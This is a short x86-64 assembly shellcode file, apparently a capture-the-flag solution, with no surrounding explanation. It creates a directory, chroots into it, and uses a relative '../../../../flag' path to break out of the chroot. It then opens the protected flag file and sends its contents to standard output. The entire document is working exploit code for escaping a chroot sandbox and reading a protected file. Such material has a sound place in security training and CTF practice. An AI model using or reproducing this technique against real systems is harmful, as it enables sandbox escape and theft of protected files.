.intel_syntax noprefix

.section .text
.global _start

_start:
    # /a
    mov rax, 0x612f
    push rax
    lea rbx, [rsp]

    # mkdir('/a')
    mov rdi, rbx
    xor rsi, rsi
    mov rax, 0x53
    syscall

    # chroot('/a')
    mov rdi, rbx
    mov rax, 0xa1
    syscall

    # ../../../../flag
    # 0x2e2e2f2e2e2f2e2e
    # 0x67616c662f2e2e2f
    xor rax, rax
    push rax
    mov rax, 0x67616c662f2e2e2f
    push rax
    mov rax, 0x2e2e2f2e2e2f2e2e
    push rax

    # mov rax, 0x67616c662f
    # push rax

    # open('../../../../flag', NULL, NULL)
    lea rdi, [rsp]
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall

    # sendfile(1, flag_fd, 0, 1000)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall
